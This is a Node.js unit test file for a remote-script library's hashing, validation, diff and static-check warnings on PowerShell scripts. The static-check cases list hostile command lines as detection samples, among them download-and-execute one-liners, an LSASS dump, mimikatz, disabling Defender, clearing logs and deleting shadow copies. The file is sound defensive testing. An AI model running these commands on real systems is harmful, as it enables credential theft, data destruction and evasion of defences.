#!/usr/bin/env node
// Tests for the script library's pure parts, run against dist:
//
//   cd apps/api && npx nest build && node scripts/unit-script-library.mjs
//
// Hashing (content and definition), content and parameter validation, the
// contributor rule behind SAME_PERSON, the line diff, and every static-check
// rule against scripts that should and should not trip it. No database.
//
// The static checks are warnings by design. A "should not flag" case here is
// there to keep the noise down, not to claim the clean script is safe.

import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';
import { createHash } from 'node:crypto';

const here = dirname(fileURLToPath(import.meta.url));
const require = createRequire(import.meta.url);
const d = require(join(here, '..', 'dist', 'script-library', 'definition.js'));
const sc = require(join(here, '..', 'dist', 'script-library', 'static-checks.js'));

let passed = 0;
const failures = [];
const check = (name, ok, detail = '') => { if (ok) passed++; else failures.push(`${name}${detail ? ` — ${detail}` : ''}`); };
const sha = (b) => createHash('sha256').update(b).digest('hex');

// ── Content hashing ─────────────────────────────────────────────────────────
{
  const s = 'Get-Service Spooler\r\n';
  check('content SHA-256 is of the exact UTF-8 bytes', d.sha256Hex(s) === sha(Buffer.from(s, 'utf8')));
  check('line endings are not normalised: CRLF and LF hash differently', d.sha256Hex('a\r\nb') !== d.sha256Hex('a\nb'));
  check('a trailing newline changes the hash', d.sha256Hex('a') !== d.sha256Hex('a\n'));
  check('non-ASCII is hashed as UTF-8', d.sha256Hex('Write-Host "café"') === sha(Buffer.from('Write-Host "café"', 'utf8')));
  const v = { language: 'powershell', targetOs: 'windows', risk: 'low', parameters: [], content: s };
  const h = d.hashVersion(v);
  check('hashVersion: content hash, byte count and definition hash', h.contentSha256 === sha(s) && h.contentBytes === Buffer.byteLength(s) && /^[0-9a-f]{64}$/.test(h.definitionSha256));
  const expectDef = sha(`rem0te-script-definition-v1\n{"contentSha256":"${h.contentSha256}","language":"powershell","parameters":[],"risk":"low","targetOs":"windows"}`);
  check('definition hash is the prefix plus canonical JSON with sorted keys', h.definitionSha256 === expectDef, h.definitionSha256);
  check('changing the risk changes the definition hash, not the content hash', (() => { const h2 = d.hashVersion({ ...v, risk: 'high' }); return h2.contentSha256 === h.contentSha256 && h2.definitionSha256 !== h.definitionSha256; })());
  const p1 = [{ name: 'Service', type: 'string', required: true, charset: 'identifier', maxLength: 64 }];
  const p2 = [{ maxLength: 64, charset: 'identifier', required: true, type: 'string', name: 'Service' }];
  check('parameter key order does not change the definition hash (canonical)', d.hashVersion({ ...v, parameters: p1 }).definitionSha256 === d.hashVersion({ ...v, parameters: p2 }).definitionSha256);
  check('a parameter limit changes the definition hash', d.hashVersion({ ...v, parameters: p1 }).definitionSha256 !== d.hashVersion({ ...v, parameters: [{ ...p1[0], maxLength: 65 }] }).definitionSha256);
  check('canonical JSON sorts nested keys and keeps array order', d.canonical({ b: [2, 1], a: { d: 1, c: 2 } }) === '{"a":{"c":2,"d":1},"b":[2,1]}');
}

// ── Content validation ──────────────────────────────────────────────────────
{
  check('empty content is refused', !!d.contentProblem(''));
  check('whitespace-only content is refused', !!d.contentProblem(' \n\t '));
  check('content of exactly 64 KiB is accepted', d.contentProblem('a'.repeat(65_536)) === null);
  check('content over 64 KiB is refused', /limit/.test(d.contentProblem('a'.repeat(65_537)) ?? ''));
  check('the limit is in bytes, not characters', !!d.contentProblem('é'.repeat(32_769)));
  check('a NUL is refused', /U\+0000/.test(d.contentProblem('Write-Host 1\u0000') ?? ''));
  check('an escape character is refused', /U\+001B/.test(d.contentProblem('\u001b[31m') ?? ''));
  check('DEL is refused', !!d.contentProblem('a\u007f'));
  check('tab, CR and LF are accepted', d.contentProblem('if ($x) {\r\n\tWrite-Host 1\r\n}\n') === null);
  check('a lone surrogate is refused (it would not round-trip as UTF-8)', !!d.contentProblem('a\uD800b'));
  check('a real astral character is accepted', d.contentProblem('Write-Host "\u{1F600}"') === null);
}

// ── Version fields and parameters ───────────────────────────────────────────
{
  const ok = (p) => d.Parameters.safeParse(p).success;
  check('a string parameter needs a charset and a maximum length', ok([{ name: 'Svc', type: 'string', required: true, charset: 'identifier', maxLength: 32 }]) && !ok([{ name: 'Svc', type: 'string', required: true, maxLength: 32 }]) && !ok([{ name: 'Svc', type: 'string', required: true, charset: 'identifier' }]));
  check('only the closed charsets are accepted (no author regex)', !ok([{ name: 'Svc', type: 'string', required: true, charset: '^.*$', maxLength: 32 }]) && !ok([{ name: 'Svc', type: 'string', required: true, charset: 'identifier', maxLength: 32, pattern: '.*' }]));
  check('maxLength is 1 to 256', !ok([{ name: 'S', type: 'string', required: true, charset: 'identifier', maxLength: 0 }]) && !ok([{ name: 'S', type: 'string', required: true, charset: 'identifier', maxLength: 257 }]));
  check('integer min must not exceed max', ok([{ name: 'N', type: 'integer', required: false, min: 1, max: 10 }]) && !ok([{ name: 'N', type: 'integer', required: false, min: 10, max: 1 }]));
  check('a choice is 1–20 distinct identifiers', ok([{ name: 'C', type: 'choice', required: true, choices: ['a', 'b'] }]) && !ok([{ name: 'C', type: 'choice', required: true, choices: [] }]) && !ok([{ name: 'C', type: 'choice', required: true, choices: ['a', 'a'] }]) && !ok([{ name: 'C', type: 'choice', required: true, choices: ['a;b'] }]));
  check('parameter names: letter first, no punctuation', !ok([{ name: '1x', type: 'boolean', required: true }]) && !ok([{ name: 'a-b', type: 'boolean', required: true }]) && !ok([{ name: '$x', type: 'boolean', required: true }]));
  check('parameter names are distinct case-insensitively (as PowerShell binds them)', !ok([{ name: 'Name', type: 'boolean', required: true }, { name: 'name', type: 'boolean', required: true }]));
  check('at most 10 parameters', ok(Array.from({ length: 10 }, (_, i) => ({ name: `P${i}`, type: 'boolean', required: false }))) && !ok(Array.from({ length: 11 }, (_, i) => ({ name: `P${i}`, type: 'boolean', required: false }))));
  check('an unknown type or field is refused', !ok([{ name: 'X', type: 'scriptblock', required: true }]) && !ok([{ name: 'X', type: 'boolean', required: true, default: true }]));
  const base = { description: 'Restarts the spooler', risk: 'low', content: 'x' };
  check('version fields default to PowerShell on Windows', (() => { const r = d.VersionFields.safeParse(base); return r.success && r.data.language === 'powershell' && r.data.targetOs === 'windows' && Array.isArray(r.data.parameters); })());
  check('another language or OS is refused', !d.VersionFields.safeParse({ ...base, language: 'bash' }).success && !d.VersionFields.safeParse({ ...base, targetOs: 'linux' }).success);
  check('an unknown risk is refused', !d.VersionFields.safeParse({ ...base, risk: 'none' }).success);
  check('extra fields (authorId, status, contentSha256) are refused', ['authorId', 'status', 'contentSha256', 'approvedSha256'].every((k) => !d.VersionFields.safeParse({ ...base, [k]: 'x' }).success));
  for (const [cs, good, badv] of [['alphanumeric', 'abc123', 'a-b'], ['identifier', 'Spooler_1.x-y', 'a b'], ['hostname', 'pc-1.example.com', 'pc_1'], ['safe_text', 'Hello, world: a@b.c', 'a;b']]) {
    check(`charset ${cs} accepts ${JSON.stringify(good)} and refuses ${JSON.stringify(badv)}`, d.CHARSETS[cs].test(good) && !d.CHARSETS[cs].test(badv));
  }
  const hostile = ['"', "'", '$', '`', ';', '|', '&', '(', ')', '\n', '\r', '<', '>', '{', '}', '%', '\\', '/'];
  check('no charset admits a quote, $, backtick, ;, |, &, parentheses, a newline, redirection or a path separator',
    Object.entries(d.CHARSETS).every(([, re]) => hostile.every((ch) => !re.test(`a${ch}b`))));
}

// ── Contributors (the rule behind SAME_PERSON) ──────────────────────────────
{
  check('a first version: only its author', JSON.stringify(d.contributorsOf('A', null)) === '["A"]');
  check('edited from an unapproved version: the earlier contributors carry over', JSON.stringify(d.contributorsOf('B', { status: 'DRAFT', contributorIds: ['A'] }).sort()) === '["A","B"]');
  check('…including from a rejected or in-review version', d.contributorsOf('B', { status: 'REJECTED', contributorIds: ['A'] }).includes('A') && d.contributorsOf('B', { status: 'IN_REVIEW', contributorIds: ['A', 'C'] }).length === 3);
  check('edited from an approved version: only the new author (the base was reviewed)', JSON.stringify(d.contributorsOf('B', { status: 'APPROVED', contributorIds: ['A'] })) === '["B"]');
  check('no duplicates when the same person edits again', JSON.stringify(d.contributorsOf('A', { status: 'DRAFT', contributorIds: ['A'] })) === '["A"]');
}

// ── Line diff ───────────────────────────────────────────────────────────────
{
  const r = d.lineDiff('a\nb\nc', 'a\nB\nc\nd');
  check('diff: one change and one addition', r.added === 2 && r.removed === 1 && !r.tooLarge, JSON.stringify(r));
  check('diff: lines in order with line numbers', r.lines.map((l) => l.op + l.text).join('|') === ' a|-b|+B| c|+d' && r.lines[0].a === 1 && r.lines[0].b === 1 && r.lines[4].b === 4, r.lines.map((l) => l.op + l.text).join('|'));
  const same = d.lineDiff('x\ny', 'x\ny');
  check('diff: identical text has no changes', same.added === 0 && same.removed === 0 && same.lines.length === 2);
  const all = d.lineDiff('', 'p\nq');
  check('diff: from empty', all.added === 2 && all.removed === 1);
  const crlf = d.lineDiff('a\r\nb', 'a\nb');
  check('diff: line splitting accepts CRLF (the hashes still differ)', crlf.added === 0 && crlf.removed === 0);
  // Reconstruct both sides from the diff for a larger random case.
  const A = Array.from({ length: 400 }, (_, i) => `line ${i % 37}`), B = A.filter((_, i) => i % 5).map((l, i) => (i % 11 ? l : `${l}!`));
  const big = d.lineDiff(A.join('\n'), B.join('\n'));
  const backA = big.lines.filter((l) => l.op !== '+').map((l) => l.text), backB = big.lines.filter((l) => l.op !== '-').map((l) => l.text);
  check('diff: both sides reconstruct exactly', JSON.stringify(backA) === JSON.stringify(A) && JSON.stringify(backB) === JSON.stringify(B));
  const huge = d.lineDiff(Array.from({ length: 3000 }, (_, i) => `a${i}`).join('\n'), Array.from({ length: 3000 }, (_, i) => `b${i}`).join('\n'));
  check('diff: a diff beyond the edit bound is reported as too large, not computed', huge.tooLarge === true && huge.lines.length === 0);
}

// ── Static checks ───────────────────────────────────────────────────────────
const rules = (src, risk) => sc.staticCheck(src, risk).findings.map((f) => f.rule);
const has = (src, rule) => rules(src).includes(rule);
{
  const cases = {
    invoke_expression: ['Invoke-Expression $cmd', 'iex (Get-Content x.ps1 -Raw)', '$x | IEX'],
    download: ['Invoke-WebRequest https://x.test/a.exe -OutFile a.exe', 'iwr https://x.test | iex', '(New-Object Net.WebClient).DownloadString("http://x")', 'Start-BitsTransfer -Source http://x', 'certutil -urlcache -f http://x a.exe', 'irm https://x.test/s.ps1', 'curl.exe http://x'],
    encoded_command: ['powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBi', 'powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi', '[Convert]::FromBase64String($b)'],
    credential_material: ['$p = ConvertTo-SecureString "Hunter2!" -AsPlainText -Force', '$adminPassword = "Summer2026!"', '-----BEGIN RSA PRIVATE KEY-----', 'rundll32 comsvcs.dll MiniDump (Get-Process lsass).Id', 'cmdkey /list', 'mimikatz.exe', '$apiToken = \'abcd1234\'', 'Get-Credential'],
    defender_disabled: ['Set-MpPreference -DisableRealtimeMonitoring $true', 'Add-MpPreference -ExclusionPath C:\\temp', 'Stop-Service WinDefend', 'sc.exe config WinDefend start= disabled', 'reg add ... /v DisableAntiSpyware /d 1'],
    execution_policy: ['Set-ExecutionPolicy Unrestricted', 'powershell -ExecutionPolicy Bypass -File x.ps1', 'powershell -ep bypass'],
    forced_restart: ['Restart-Computer -Force', 'shutdown /r /f /t 0', 'shutdown.exe /f /s', 'Stop-Computer -Force'],
    restart: ['Restart-Computer', 'shutdown /r /t 600', 'Stop-Computer -ComputerName pc1'],
    log_tampering: ['Clear-EventLog -LogName Security', 'wevtutil cl System', 'auditpol /clear /y', 'Remove-EventLog -LogName Custom'],
    backup_deletion: ['vssadmin delete shadows /all /quiet', 'wbadmin delete catalog', 'Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }', 'bcdedit /set {default} recoveryenabled No'],
    local_admin: ['Add-LocalGroupMember -Group Administrators -Member bob', 'net localgroup administrators bob /add'],
    dynamic_code: ['Add-Type -TypeDefinition $src', '[System.Reflection.Assembly]::Load($bytes)', 'Invoke-Command -ScriptBlock { 1 }', 'Start-Process notepad', '[ScriptBlock]::Create($s)', 'New-Object -ComObject Shell.Application'],
  };
  for (const [rule, srcs] of Object.entries(cases)) {
    for (const s of srcs) check(`flags ${rule}: ${s.slice(0, 60)}`, has(s, rule), JSON.stringify(rules(s)));
  }
  const clean = [
    'Get-Service -Name Spooler | Select-Object Status',
    'Restart-Service -Name Spooler',
    '$exprResult = 1 + 2',
    'Write-Host "Invoke-Expressions are bad"', // a word inside a word is not iex…
    'Get-ChildItem -ErrorAction SilentlyContinue',
    '$encoding = [Text.Encoding]::UTF8',
    'Get-EventLog -LogName System -Newest 5',
    '$PasswordLastSet = (Get-LocalUser bob).PasswordLastSet',
    'Get-MpComputerStatus',
  ];
  for (const s of clean) check(`does not flag: ${s}`, rules(s).length === 0, JSON.stringify(rules(s)));
  check('a word containing iex is not Invoke-Expression', !has('$niexus = 1', 'invoke_expression') && !has('Get-Iexplore', 'invoke_expression'));

  const hidden = 'Write-Host "ok" \u202E// })\u2066';
  check('hidden: a bidirectional override is flagged', has(hidden, 'hidden_unicode'));
  check('hidden: a zero-width space is flagged', has('Get-Ser\u200Bvice', 'hidden_unicode'));
  check('hidden: a BOM inside the text is flagged', has('a\n\uFEFFb', 'hidden_unicode'));
  check('hidden: the excerpt shows the character instead of hiding it', sc.staticCheck('x\u202Ey').findings[0].excerpt.includes('<U+202E>'));

  const multi = 'Get-Service\nInvoke-Expression $a\nRestart-Computer -Force';
  const f = sc.staticCheck(multi, 'medium').findings;
  check('findings carry line numbers, severity, title and reason', f.length === 2 && f[0].line === 2 && f[0].severity === 'danger' && f[1].line === 3 && f.every((x) => x.title && x.why && x.excerpt));
  check('a forced restart is reported once, as the stronger rule', JSON.stringify(rules('Restart-Computer -Force')) === '["forced_restart"]');
  check('declared low risk with a danger finding is called out', rules('iex $a', 'low').includes('risk_understated') && !rules('iex $a', 'high').includes('risk_understated') && !rules('Restart-Computer', 'low').includes('risk_understated'));
  const many = Array.from({ length: 300 }, () => 'iex $a').join('\n');
  const capped = sc.staticCheck(many);
  check('findings are capped and say so', capped.findings.length === 200 && capped.truncated === true);
  check('static checks report a checker version', sc.CHECKER_VERSION === 1 && sc.staticCheck('x').checkerVersion === 1);
  check('every rule has an id, a severity and a reason', sc.RULES.every((r) => /^[a-z_]+$/.test(r.id) && ['caution', 'danger'].includes(r.severity) && r.why.length > 20) && new Set(sc.RULES.map((r) => r.id)).size === sc.RULES.length);
  // Flag; don't block: the checker returns findings, it never throws and has no verdict.
  check('the checker returns findings and no verdict', (() => { const r = sc.staticCheck('iex $a'); return !('ok' in r) && !('safe' in r) && !('blocked' in r); })());
  // ReDoS: each rule finishes quickly on a long hostile line.
  const t0 = Date.now();
  for (const pat of ['-'.repeat(20000), 'shutdown ' + '/x '.repeat(5000), 'Set-MpPreference ' + 'a'.repeat(20000), '$password' + ' '.repeat(20000) + '=']) sc.staticCheck(pat);
  check('rules stay fast on long hostile lines', Date.now() - t0 < 2000, `${Date.now() - t0} ms`);
}

console.log(`unit-script-library: ${passed} passed, ${failures.length} failed`);
if (failures.length) { for (const f of failures) console.log(`  ✗ ${f}`); process.exit(1); }
